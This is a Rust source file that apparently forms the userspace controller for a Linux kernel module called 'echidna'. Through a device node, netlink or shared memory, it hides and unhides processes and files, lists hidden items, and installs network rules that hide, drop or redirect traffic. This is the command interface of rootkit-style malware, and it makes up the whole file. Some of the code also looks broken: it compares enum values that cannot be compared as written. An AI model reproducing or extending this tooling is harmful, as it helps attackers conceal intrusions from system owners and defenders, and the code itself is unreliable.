use std::error::Error;
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::os::unix::io::AsRawFd;
use serde::{Deserialize, Serialize};

pub mod device;
pub mod netlink;
pub mod shared_mem;

use device::DeviceInterface;
use netlink::NetlinkInterface;
use shared_mem::SharedMemoryInterface;

/// Commands that can be sent to the kernel module
#[derive(Debug, Serialize, Deserialize)]
pub enum KernelCommand {
    /// Initialize the kernel module
    Initialize,
    /// Hide a process by PID
    HideProcess(u32),
    /// Unhide a process by PID
    UnhideProcess(u32),
    /// Hide a file/directory by path
    HideFile(String),
    /// Unhide a file/directory by path
    UnhideFile(String),
    /// Get list of hidden processes
    ListHiddenProcesses,
    /// Get list of hidden files
    ListHiddenFiles,
    /// Install network filter rules
    InstallNetFilter(NetworkRule),
    /// Remove network filter rules
    RemoveNetFilter(String),
    /// Get kernel module status
    GetStatus,
    /// Clean shutdown of kernel module
    Shutdown,
}

/// Response from kernel module operations
#[derive(Debug, Serialize, Deserialize)]
pub enum KernelResponse {
    /// Operation completed successfully
    Success(String),
    /// Operation failed with error message
    Error(String),
    /// Status information
    Status(ModuleStatus),
    /// List of processes
    ProcessList(Vec<u32>),
    /// List of files
    FileList(Vec<String>),
}

/// Network filtering rule
#[derive(Debug, Serialize, Deserialize)]
pub struct NetworkRule {
    /// Rule identifier
    pub id: String,
    /// Source IP address (optional)
    pub src_ip: Option<String>,
    /// Destination IP address (optional)
    pub dst_ip: Option<String>,
    /// Source port (optional)
    pub src_port: Option<u16>,
    /// Destination port (optional)
    pub dst_port: Option<u16>,
    /// Protocol (TCP, UDP, etc.)
    pub protocol: Option<String>,
    /// Action (HIDE, DROP, REDIRECT)
    pub action: String,
}

/// Kernel module status information
#[derive(Debug, Serialize, Deserialize)]
pub struct ModuleStatus {
    /// Whether the module is loaded and active
    pub active: bool,
    /// Number of processes currently hidden
    pub hidden_processes: u32,
    /// Number of files currently hidden
    pub hidden_files: u32,
    /// Number of active network rules
    pub network_rules: u32,
    /// Module version
    pub version: String,
    /// Last error message (if any)
    pub last_error: Option<String>,
}

/// Main bridge structure for kernel-userspace communication
pub struct KernelBridge {
    /// Character device interface
    device_interface: Option<DeviceInterface>,
    /// Netlink socket interface
    netlink_interface: Option<NetlinkInterface>,
    /// Shared memory interface
    shared_memory: Option<SharedMemoryInterface>,
    /// Preferred communication method
    preferred_method: CommunicationMethod,
    /// Bridge initialization status
    initialized: bool,
}

/// Available communication methods
#[derive(Debug, Clone)]
pub enum CommunicationMethod {
    /// Character device (/dev/echidna_control)
    CharacterDevice,
    /// Netlink socket
    NetlinkSocket,
    /// Shared memory region
    SharedMemory,
    /// Automatic selection based on availability
    Auto,
}

impl KernelBridge {
    /// Create a new kernel bridge instance
    pub fn new() -> Result<Self, Box<dyn Error>> {
        let mut bridge = Self {
            device_interface: None,
            netlink_interface: None,
            shared_memory: None,
            preferred_method: CommunicationMethod::Auto,
            initialized: false,
        };

        // Attempt to initialize communication interfaces
        bridge.initialize()?;
        
        Ok(bridge)
    }

    /// Initialize the kernel bridge with available communication methods
    pub fn initialize(&mut self) -> Result<(), Box<dyn Error>> {
        if self.initialized {
            return Ok(());
        }

        let mut available_methods = Vec::new();

        // Try to initialize character device interface
        match DeviceInterface::new() {
            Ok(device) => {
                self.device_interface = Some(device);
                available_methods.push(CommunicationMethod::CharacterDevice);
            }
            Err(e) => {
                eprintln!("Failed to initialize character device interface: {}", e);
            }
        }

        // Try to initialize netlink interface
        match NetlinkInterface::new() {
            Ok(netlink) => {
                self.netlink_interface = Some(netlink);
                available_methods.push(CommunicationMethod::NetlinkSocket);
            }
            Err(e) => {
                eprintln!("Failed to initialize netlink interface: {}", e);
            }
        }

        // Try to initialize shared memory interface
        match SharedMemoryInterface::new() {
            Ok(shared_mem) => {
                self.shared_memory = Some(shared_mem);
                available_methods.push(CommunicationMethod::SharedMemory);
            }
            Err(e) => {
                eprintln!("Failed to initialize shared memory interface: {}", e);
            }
        }

        if available_methods.is_empty() {
            return Err("No communication methods available".into());
        }

        // Select preferred method
        self.preferred_method = match self.preferred_method {
            CommunicationMethod::Auto => {
                // Prefer character device, then netlink, then shared memory
                if available_methods.contains(&CommunicationMethod::CharacterDevice) {
                    CommunicationMethod::CharacterDevice
                } else if available_methods.contains(&CommunicationMethod::NetlinkSocket) {
                    CommunicationMethod::NetlinkSocket
                } else {
                    CommunicationMethod::SharedMemory
                }
            }
            method => method,
        };

        self.initialized = true;
        Ok(())
    }

    /// Send a command to the kernel module
    pub fn send_command(&mut self, command: KernelCommand) -> Result<KernelResponse, Box<dyn Error>> {
        if !self.initialized {
            return Err("Bridge not initialized".into());
        }

        match &self.preferred_method {
            CommunicationMethod::CharacterDevice => {
                if let Some(ref mut device) = self.device_interface {
                    device.send_command(command)
                } else {
                    Err("Character device interface not available".into())
                }
            }
            CommunicationMethod::NetlinkSocket => {
                if let Some(ref mut netlink) = self.netlink_interface {
                    netlink.send_command(command)
                } else {
                    Err("Netlink interface not available".into())
                }
            }
            CommunicationMethod::SharedMemory => {
                if let Some(ref mut shared_mem) = self.shared_memory {
                    shared_mem.send_command(command)
                } else {
                    Err("Shared memory interface not available".into())
                }
            }
            CommunicationMethod::Auto => {
                unreachable!("Auto method should be resolved during initialization")
            }
        }
    }

    /// Get the current status of the kernel module
    pub fn get_status(&mut self) -> Result<ModuleStatus, Box<dyn Error>> {
        match self.send_command(KernelCommand::GetStatus)? {
            KernelResponse::Status(status) => Ok(status),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Check if the kernel module is loaded and responsive
    pub fn is_module_loaded(&mut self) -> bool {
        self.get_status().is_ok()
    }

    /// Hide a process by PID
    pub fn hide_process(&mut self, pid: u32) -> Result<String, Box<dyn Error>> {
        match self.send_command(KernelCommand::HideProcess(pid))? {
            KernelResponse::Success(msg) => Ok(msg),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Unhide a process by PID
    pub fn unhide_process(&mut self, pid: u32) -> Result<String, Box<dyn Error>> {
        match self.send_command(KernelCommand::UnhideProcess(pid))? {
            KernelResponse::Success(msg) => Ok(msg),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Hide a file or directory
    pub fn hide_file(&mut self, path: &str) -> Result<String, Box<dyn Error>> {
        match self.send_command(KernelCommand::HideFile(path.to_string()))? {
            KernelResponse::Success(msg) => Ok(msg),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Unhide a file or directory
    pub fn unhide_file(&mut self, path: &str) -> Result<String, Box<dyn Error>> {
        match self.send_command(KernelCommand::UnhideFile(path.to_string()))? {
            KernelResponse::Success(msg) => Ok(msg),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Install a network filtering rule
    pub fn install_network_rule(&mut self, rule: NetworkRule) -> Result<String, Box<dyn Error>> {
        match self.send_command(KernelCommand::InstallNetFilter(rule))? {
            KernelResponse::Success(msg) => Ok(msg),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Remove a network filtering rule
    pub fn remove_network_rule(&mut self, rule_id: &str) -> Result<String, Box<dyn Error>> {
        match self.send_command(KernelCommand::RemoveNetFilter(rule_id.to_string()))? {
            KernelResponse::Success(msg) => Ok(msg),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Get list of currently hidden processes
    pub fn get_hidden_processes(&mut self) -> Result<Vec<u32>, Box<dyn Error>> {
        match self.send_command(KernelCommand::ListHiddenProcesses)? {
            KernelResponse::ProcessList(pids) => Ok(pids),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Get list of currently hidden files
    pub fn get_hidden_files(&mut self) -> Result<Vec<String>, Box<dyn Error>> {
        match self.send_command(KernelCommand::ListHiddenFiles)? {
            KernelResponse::FileList(files) => Ok(files),
            KernelResponse::Error(err) => Err(err.into()),
            _ => Err("Unexpected response format".into()),
        }
    }

    /// Set the preferred communication method
    pub fn set_communication_method(&mut self, method: CommunicationMethod) -> Result<(), Box<dyn Error>> {
        // Validate that the requested method is available
        let available = match method {
            CommunicationMethod::CharacterDevice => self.device_interface.is_some(),
            CommunicationMethod::NetlinkSocket => self.netlink_interface.is_some(),
            CommunicationMethod::SharedMemory => self.shared_memory.is_some(),
            CommunicationMethod::Auto => true,
        };

        if !available {
            return Err("Requested communication method is not available".into());
        }

        self.preferred_method = method;
        Ok(())
    }

    /// Clean up and shut down the kernel bridge
    pub fn cleanup(&mut self) -> Result<(), Box<dyn Error>> {
        if !self.initialized {
            return Ok(());
        }

        // Send shutdown command to kernel module
        let _ = self.send_command(KernelCommand::Shutdown);

        // Clean up interfaces
        if let Some(ref mut device) = self.device_interface {
            device.cleanup()?;
        }
        
        if let Some(ref mut netlink) = self.netlink_interface {
            netlink.cleanup()?;
        }
        
        if let Some(ref mut shared_mem) = self.shared_memory {
            shared_mem.cleanup()?;
        }

        self.initialized = false;
        Ok(())
    }
}

impl Drop for KernelBridge {
    fn drop(&mut self) {
        let _ = self.cleanup();
    }
}